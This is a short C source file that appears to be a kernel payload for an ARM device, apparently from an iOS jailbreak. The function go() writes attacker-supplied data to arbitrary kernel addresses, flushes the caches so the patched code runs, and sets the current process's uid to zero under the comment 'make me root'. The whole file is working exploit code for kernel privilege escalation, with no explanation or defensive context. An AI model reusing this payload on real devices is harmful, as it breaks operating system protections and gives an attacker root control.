#include <stdint.h>
#include <sys/types.h>

#define LC __attribute__((long_call))
LC void *current_proc();
LC void *proc_ucred(void *);
LC void *memcpy(void *, const void *, size_t);
LC void invalidate_icache(uint32_t, unsigned, int);
LC void flush_dcache(uint32_t, unsigned, int);

static char *ptr asm("sp");

__attribute__((naked))
void go() {
    while(1) {
        uint32_t *p = (void *) ptr;
        uint32_t addr = p[0];
        uint32_t datalen = p[1];
        if(!addr) break;
        char *data = (void *) &p[2];
        ptr = data + datalen;
        memcpy((void *) addr, data, datalen);
        flush_dcache(addr, datalen, 0);
        invalidate_icache(addr, datalen, 0);
    }

    // make me root
    ((uint32_t *) proc_ucred(current_proc()))[3] = 0;
    asm volatile("bx sp; .align 2; .arm; ldm sp, {r4, r7, pc}^");
}

